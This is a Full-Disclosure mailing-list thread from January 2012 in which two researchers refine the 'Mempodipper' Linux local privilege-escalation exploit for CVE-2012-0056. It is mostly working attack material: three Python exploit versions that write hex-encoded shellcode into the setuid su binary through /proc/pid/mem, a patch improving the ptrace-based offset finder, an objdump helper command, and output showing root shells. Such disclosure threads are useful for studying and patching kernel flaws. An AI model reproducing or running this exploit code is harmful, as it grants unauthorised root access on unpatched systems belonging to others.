@@ -1,0 +1,330 @@
+
+Date: Tue, 24 Jan 2012 11:32:05 +0100
+From: sd <sd@...ksheep.org>
+To: full-disclosure@...ts.grok.org.uk
+Subject: Re: Linux Local Root -- CVE-2012-0056 -- Detailed
+	Write-up
+
+sweet, now its almost reliable :)
+
+tl;dr:
+that python sketch just walks the return adress from stack at exit and
+its safe to assume a function call is there (duh, since retaddr is on stack)
+if its within reasonable threshold for .text, plt from there is obvious.
+
+BUT, if you want to be truly anal about it singlestepping from that fprintf
+isnt too precise either, theres possibility you'll just poke random places
+because the call is not really guaranteed to point at plt.
+
+not to mention ptrace_poketext demands word-aligned access - which
+doesnt hurt since plts are always word aligned anyways.
+
+ftfy:
+
+diff --git a/mempodipper.c b/mempodipper.c
+index dcc037c..cbbb5d0 100644
+--- a/mempodipper.c
++++ b/mempodipper.c
+@@ -127,10 +127,8 @@ unsigned long ptrace_address()
+ #endif
+                        if (instruction_pointer < upper_bound) {
+                                uint32_t instruction =
+ptrace(PTRACE_PEEKTEXT, child, instruction_pointer, NULL);
+-                               int operator = instruction & 0xFF;
+-                               if (operator == 0xe8 /* call */) {
+-                                       int32_t offset =
+ptrace(PTRACE_PEEKTEXT, child, instruction_pointer + 1, NULL) + 5;
+-                                       return instruction_pointer + offset;
++                               if ((instruction & 0xffff) == 0x25ff) {
++                                       return instruction_pointer;
+                                }
+                        }
+                }
+
+
+2012/1/24 Jason A. Donenfeld <Jason@...c4.com>:
+> Success!
+>
+> $ ./a.out
+>
+> ===============================
+>
+>
+> =          Mempodipper        =
+>
+>
+> =           by zx2c4          =
+>
+>
+> =         Jan 21, 2012        =
+> ===============================
+>
+> [+] Opening socketpair.
+> [+] Waiting for transferred fd in parent.
+> [+] Executing child from child fork.
+> [+] Opening parent mem /proc/11351/mem in child.
+> [+] Sending fd 5 to parent.
+> [+] Received fd at 5.
+> [+] Assigning fd 5 to stderr.
+> [+] Ptracing su to find exit@plt without reading binary.
+> [+] Resolved exit@plt to 0x402298.
+> [+] Calculating su padding.
+> [+] Seeking to offset 0x40228c.
+> [+] Executing su with shellcode.
+> sh-4.2#
+>
+> http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c
+>
+> On Tue, Jan 24, 2012 at 08:35, Jason A. Donenfeld <Jason@...c4.com> wrote:
+>>
+>> I really couldn't really decipher the python without squinting, and I
+>> decided I didn't really like this method of going about it; it seems a bit
+>> fuzzy. I want things exact. Presto. Presto exact. I have been awake for a
+>> while and things like "presto exact" now make sense in my head. Maybe yours
+>> isn't fuzzy. I'm not really certain (nor coherent).
+>>
+>> So I coded up is something that waits on a pipe for the first printf to
+>> stderr, ptrace traversing using the syscall handler, and then after, it does
+>> a step at a time until it gets to an address below a massive threshold that
+>> is a "call" instruction. Instead of taking EIP here, which doesn't work if
+>> the next call is exit (ubuntu's su, though not 64bit gentoo's), I read for
+>> the 0xe8 call, and then the 4 bytes after that, and add it to EIP to get
+>> where it's going to call to.
+>>
+>> First time using ptrace.
+>>
+>> The result is this:
+>> http://git.zx2c4.com/CVE-2012-0056/tree/ptrace-offset-finder.c
+>>
+>> The four systems I've tested it on, it's completely accurate and very
+>> fast. Now adding the code to mempodipper.
+>>
+>> On Mon, Jan 23, 2012 at 21:42, sd <sd@...ksheep.org> wrote:
+>>>
+>>> ptrace aint exactly rocket science :)
+>>> this one is OCD friendly (no spraying & detects prefix length).
+>>>
+>>> looking forward to your C port (python aint exactly great for real
+>>> world use because of various deps).
+>>>
+>>> #!/usr/bin/python
+>>> # CVE-2012-0056 amd64
+>>> # sd@...ksheep.org
+>>> #
+>>> # hg clone https://bitbucket.org/haypo/python-ptrace
+>>> # (cd python-ptrace && ./setup.py install --home=~)
+>>> # hg clone https://code.google.com/p/python-passfd
+>>> # (cd python-passfd && ./setup.py install --home=~)
+>>> # PYTHONPATH=~/lib/python ./hurrdurr.py
+>>> from socket import *
+>>> from passfd import *
+>>> from os import *
+>>> from socket import *
+>>> from sys import *
+>>> from ptrace.binding import *
+>>> from time import *
+>>>
+>>>
+>>> if argv[-1]=='hax':
+>>>        sk=int(argv[1])
+>>>        fd=open("/proc/%d/mem"%getppid(),O_WRONLY)
+>>>        lseek(fd,int(argv[2]),0)
+>>>        sendfd(sk,fd)
+>>> else:
+>>>        r,w=pipe()
+>>>        pid=fork()
+>>>        if not pid:
+>>>                dup2(w,2)
+>>>                ptrace_traceme()
+>>>                execl("/bin/su","su","h4x0rr")
+>>>        wait()
+>>>        while ptrace_getregs(pid).orig_rax not in (60,231):
+>>>                ptrace_syscall(pid)
+>>>                wait()
+>>>        rip=filter(lambda x: x>0x00400000 and x<0x09000000,
+>>>                [ptrace_peektext(pid,
+>>>                ptrace_getregs(pid).rsp+i) for i in range(0,256,8)])[0]
+>>>
+>>>  data=(ptrace_peektext(pid,(rip-4)&(~7))|ptrace_peektext(pid,(rip+4)&(~7))<<64)
+>>>
+>>>  rip=((rip+(data>>(((rip-4)&7)*8)))&0xffffffff)-read(r,32).find('h4x0rr')
+>>>        a,b=socketpair()
+>>>        if not fork():
+>>>                execl("/usr/bin/python","python",
+>>>                      __file__,str(a.fileno()),str(rip),'hax')
+>>>        dup2(recvfd(b)[0],2)
+>>>        execl("/bin/su","su","\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2"+
+>>>                "\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb"+
+>>>                "\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6"+
+>>>                "\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05");
+>>>
+>>>
+>>> 2012/1/23 Jason A. Donenfeld <Jason@...c4.com>:
+>>> > I started on a ptrace based way of finding things, but I'm a bit of a
+>>> > novice
+>>> > in this area. It's not working yet, but progress is here:
+>>> > http://git.zx2c4.com/CVE-2012-0056/tree/exit-ptrace-finder.c
+>>> >
+>>> > Any pointers?
+>>> >
+>>> >
+>>> > On Mon, Jan 23, 2012 at 04:05, Jason A. Donenfeld <Jason@...c4.com>
+>>> > wrote:
+>>> >>
+>>> >> Well done; that's a nice trick. Not really a fan of "spraying" like
+>>> >> that (for irrational 'aesthetic' bullshitty reasons), but this is
+>>> >> quite nice. Still though, you have the lseek offset in there, which is
+>>> >> different for different executables.
+>>> >>
+>>> >> I'm sure there's a way to determine this without read access though --
+>>> >> ptrace, for example, will make a suid binary loose its suidness, but
+>>> >> you could then (I think?) inquire about memory locations and maps.
+>>> >> Once you have the info you need, then you run su normally sans
+>>> >> ptracing in the exploit. Not sure if this works or not. I think there
+>>> >> are a few other similar things you can do when running suid code that
+>>> >> will make it loose suidness, and also a variety of inspection
+>>> >> techniques.
+>>> >>
+>>> >> On Mon, Jan 23, 2012 at 03:46, sd <sd@...ksheep.org> wrote:
+>>> >> > 2012/1/23 Jason A. Donenfeld <Jason@...c4.com>:
+>>> >> >> NICE! Well, I guess posting that blog post defeated the point of
+>>> >> >> not
+>>> >> >> publishing. :-D
+>>> >> >
+>>> >> > Thanks for compliance with first full-disclosure famwhoring rule:
+>>> >> > always post warez to make kids happy! :)
+>>> >> >
+>>> >> > On a related note, here goes my "private" version which relaxes the
+>>> >> > rules regarding file permissions on /bin/su (ie not world readable).
+>>> >> > This is to point out you can just overwrite 8kb of .text (default
+>>> >> > stderr buffer, more is possible, but without mere nops) instead of
+>>> >> > juggling with objdump.
+>>> >> >
+>>> >> > !/usr/bin/python
+>>> >> > # CVE-2012-0056 amd64
+>>> >> > # sd@...ksheep.org
+>>> >> > #
+>>> >> > # hg clone https://code.google.com/p/python-passfd
+>>> >> > # cd python-passfd; ./setup.py build_ext --inplace; cd src
+>>> >> > # mv ~/hurrdurr.py .
+>>> >> > # ./hurrdurr.py
+>>> >> > from socket import *
+>>> >> > from passfd import *
+>>> >> > from os import *
+>>> >> > from socket import *
+>>> >> > from sys import *
+>>> >> > if argv[-1]=='hax':
+>>> >> >        sk=int(argv[1])
+>>> >> >        fd=open("/proc/%d/mem"%getppid(),O_WRONLY)
+>>> >> >        lseek(fd,0x401000,0)
+>>> >> >        sendfd(sk,fd)
+>>> >> > else:
+>>> >> >        a,b=socketpair()
+>>> >> >        if not fork():
+>>> >> >                execl("/usr/bin/python","python",
+>>> >> >                      __file__,str(a.fileno()),'hax')
+>>> >> >        dup2(recvfd(b)[0],2)
+>>> >> >
+>>> >> >
+>>> >> >  execl("/bin/su","su",("\x90"*8000)+"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2"+
+>>> >> >
+>>> >> >  "\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb"+
+>>> >> >
+>>> >> >  "\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6"+
+>>> >> >                "\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05");
+>>> >> >
+>>> >> >
+>>> >> >
+>>> >> >>
+>>> >> >> So, here's my code:
+>>> >> >>  http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c
+>>> >> >>
+>>> >> >> I wrote the shellcode by hand too, and you can grab the 32 and 64
+>>> >> >> bit
+>>> >> >> versions from that same tree.
+>>> >> >>
+>>> >> >> Have fun.
+>>> >> >>
+>>> >> >>
+>>> >> >>
+>>> >> >> BTW, before I'm asked, the reason why I don't hard code 12 for the
+>>> >> >> length of the su error string is that it's different on different
+>>> >> >> distros.
+>>> >> >>
+>>> >> >> On Mon, Jan 23, 2012 at 02:14, sd <sd@...ksheep.org> wrote:
+>>> >> >>> 2012/1/23 Jason A. Donenfeld <Jason@...c4.com>:
+>>> >> >>>> Server presently DoS'd, or dreamhost is tweaking again.
+>>> >> >>>
+>>> >> >>> boring tl;dr - don't play kaminsky on us :)
+>>> >> >>>
+>>> >> >>> #!/usr/bin/python
+>>> >> >>> # CVE-2012-0056 amd64
+>>> >> >>> # sd@...ksheep.org
+>>> >> >>> #
+>>> >> >>> # hg clone https://code.google.com/p/python-passfd
+>>> >> >>> # cd python-passfd; ./setup.py build_ext --inplace; cd src
+>>> >> >>> # mv ~/hurrdurr.py .
+>>> >> >>> # ./hurrdurr.py `objdump -d /bin/su|grep 'exit@...'|head -n 1|cut
+>>> >> >>> -d '
+>>> >> >>> ' -f 1|sed 's/^[0]*\([^0]*\)/0x\1/'`
+>>> >> >>> from socket import *
+>>> >> >>> from passfd import *
+>>> >> >>> from os import *
+>>> >> >>> from socket import *
+>>> >> >>> from sys import *
+>>> >> >>> from time import *
+>>> >> >>> if argv[-1]=='hax':
+>>> >> >>>        sk=int(argv[1])
+>>> >> >>>        fd=open("/proc/%d/mem"%getppid(),O_WRONLY)
+>>> >> >>>        lseek(fd,int(argv[2].split('x')[-1],16)-12,0)
+>>> >> >>>        sendfd(sk,fd)
+>>> >> >>>        sleep(1)
+>>> >> >>> else:
+>>> >> >>>        a,b=socketpair()
+>>> >> >>>        if not fork():
+>>> >> >>>                execl("/usr/bin/python","python",
+>>> >> >>>                      __file__,str(a.fileno()),argv[1],'hax')
+>>> >> >>>        dup2(recvfd(b)[0],2)
+>>> >> >>>
+>>> >> >>>  execl("/bin/su","su","\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2"+
+>>> >> >>>
+>>> >> >>>  "\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb"+
+>>> >> >>>
+>>> >> >>>  "\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6"+
+>>> >> >>>
+>>> >> >>>  "\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05");
+>>> >> >>>
+>>> >> >>> --
+>>> >> >>> ./hurrdurr.py `objdump -d /bin/su|grep 'exit@...'|head -n 1|cut -d
+>>> >> >>> ' '
+>>> >> >>> -f 1|sed 's/^[0]*\([^0]*\)/0x\1/'`
+>>> >> >>> id
+>>> >> >>> uid=0(root) gid=1000(sd)
+>>> >> >>>
+>>> >> >>>
+>>> >> >>> groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),110(netdev),125(lastfm),1000(sd)
+>>> >> >
+>>> >> > _______________________________________________
+>>> >> > Full-Disclosure - We believe in it.
+>>> >> > Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+>>> >> > Hosted and sponsored by Secunia - http://secunia.com/
+>>> >
+>>> >
+>>> >
+>>>
+>>> _______________________________________________
+>>> Full-Disclosure - We believe in it.
+>>> Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+>>> Hosted and sponsored by Secunia - http://secunia.com/
+>>
+>>
+>>
+>>
+>
+
+View attachment "fix.diff" of type "text/x-patch" (906 bytes)
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
